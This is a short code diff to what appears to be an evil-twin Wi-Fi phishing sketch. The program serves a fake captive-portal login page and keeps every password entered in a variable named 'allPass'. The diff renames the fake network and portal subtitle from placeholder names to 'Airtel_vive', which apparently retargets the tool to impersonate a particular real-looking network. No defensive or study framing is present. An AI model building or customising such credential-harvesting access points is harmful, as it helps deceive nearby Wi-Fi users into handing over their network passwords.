@@ -14,7 +14,7 @@
 const char* PASSWORD = "pc";
 
 // Textos padrão.
-#define SUBTITLE "TP-Link 6G+"
+#define SUBTITLE "Airtel_vive_4295"
 #define TITLE "Acesso 6G Network "
 #define BODY "To connect to our network, enter your network login. Enjoy the fastest internet from the COMPANY"
 #define POST_TITLE "Connecting.."
@@ -29,7 +29,7 @@ const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1); // Gateway
 
 // Nome padrão da Rede Wifi.
-const char *SSID_NAME = "PAWAN 6G+ Plus";
+const char *SSID_NAME = "Airtel_vive";
 
 String allPass = "";     // Para guardar todas as senhas.
 String newSSID = "";     // Para adicionar um novo SSID.
